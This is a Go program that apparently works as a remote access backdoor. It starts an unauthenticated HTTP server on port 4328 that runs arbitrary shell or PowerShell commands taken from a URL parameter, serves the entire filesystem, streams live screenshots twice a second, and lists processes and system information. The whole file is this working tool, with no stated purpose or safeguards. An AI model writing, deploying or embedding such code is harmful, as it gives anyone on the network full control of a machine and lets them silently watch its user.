package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"image/png"
	"net/http"
	"os/exec"
	"runtime"
	"strconv"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
	"github.com/shirou/gopsutil/process"
	"github.com/vova616/screenshot"
)

func handleFileServe(w http.ResponseWriter, r *http.Request) {
	var dir string

	switch runtime.GOOS {
	case "windows":
		dir = "C:/"
	default:
		dir = "/"
	}

	http.FileServer(http.Dir(dir)).ServeHTTP(w, r)
}

func handleShellCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	command := r.URL.Query().Get("command")
	if command == "" {
		http.Error(w, "Empty command", http.StatusBadRequest)
		return
	}

	output, err := runShellCommand(command)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error executing command: %s", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(output))
}

func runShellCommand(command string) (string, error) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("powershell.exe", "-Command", command)
	case "linux":
		cmd = exec.Command("sh", "-c", command)
	default:
		return "", fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed to execute command: %w", err)
	}

	return string(output), nil
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error capturing screenshot: %s", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	err = png.Encode(w, img)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error encoding screenshot: %s", err), http.StatusInternalServerError)
		return
	}
}

func handleSystemInfo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	cpuInfo, err := cpu.Info()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting CPU info: %s", err), http.StatusInternalServerError)
		return
	}

	memInfo, err := mem.VirtualMemory()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting memory info: %s", err), http.StatusInternalServerError)
		return
	}

	systemInfo := struct {
		CPU    []cpu.InfoStat         `json:"cpu"`
		Memory *mem.VirtualMemoryStat `json:"memory"`
	}{
		CPU:    cpuInfo,
		Memory: memInfo,
	}

	writeJSONResponse(w, systemInfo)
}

func handleProcesses(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	processList, err := process.Processes()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting process list: %s", err), http.StatusInternalServerError)
		return
	}

	var processRows []map[string]string

	for _, proc := range processList {
		pid := proc.Pid
		name, _ := proc.Name()
		status, _ := proc.Status()
		cmdline, _ := proc.Cmdline()

		processRow := map[string]string{
			"PID":     strconv.Itoa(int(pid)),
			"Name":    name,
			"Status":  status,
			"Cmdline": cmdline,
		}

		processRows = append(processRows, processRow)
	}

	writeJSONResponse(w, processRows)
}

func writeJSONResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(data)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error encoding JSON response: %s", err), http.StatusInternalServerError)
	}
}

func handleHtmlStream(w http.ResponseWriter, r *http.Request) {
	htmlContent := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Refresh Image</title>
</head>
<body>

<img id="screenshot" src="" alt="Screenshot">

<script>
var currentHost = window.location.hostname;
    function refreshImage() {
        var image = document.getElementById('screenshot');
        image.src = 'http://'+ currentHost + ':4328/screenshot?'+ new Date().getTime();
    }

    setInterval(refreshImage, 500);
</script>

</body>
</html>`
	tmpl, err := template.New("html").Parse(htmlContent)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, nil)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}

func main() {
	http.HandleFunc("/run", handleShellCommand)
	http.HandleFunc("/screenshot", handleScreenshot)
	http.HandleFunc("/system", handleSystemInfo)
	http.HandleFunc("/procs", handleProcesses)
	http.HandleFunc("/stream", handleHtmlStream)

	http.HandleFunc("/", handleFileServe)

	port := 4328
	fmt.Printf("Server is running on :%d\n", port)
	err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	if err != nil {
		fmt.Printf("Error starting server: %s\n", err)
	}
}
